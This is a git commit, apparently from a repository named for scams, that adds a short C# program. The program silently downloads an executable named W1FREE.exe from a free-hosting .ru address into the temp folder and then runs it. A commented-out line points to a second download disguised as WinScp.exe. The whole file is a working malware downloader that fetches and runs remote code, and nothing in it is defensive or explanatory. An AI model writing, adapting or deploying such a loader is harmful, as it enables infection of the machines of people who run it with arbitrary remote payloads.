d9944f263e150172151a747cfcda06cbfda7b64b
scamAvalanche <109234566+scamAvalanche@users.noreply.github.com>
2023-03-03 12:28:38 +0200

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,30 @@
+﻿using System;
+using System.Net;
+using System.Diagnostics;
+using System.IO;
+
+class Program
+{
+    static void Main(string[] args)
+    {
+
+        string result = Path.GetTempPath();
+
+        string url1 = "http://f0729901.xsph.ru/W1FREE.exe";
+        //string url2 = "";
+
+        string path1 = result + "\\W1Free.exe";
+        //string path2 = result + "\\WinScp.exe";
+
+        using (var client = new WebClient())
+        {
+            client.DownloadFile(url1, path1);
+            //client.DownloadFile(url2, path2);
+        }
+
+        Process.Start(path1);
+        //Process.Start(path2);
+
+        
+    }
+}
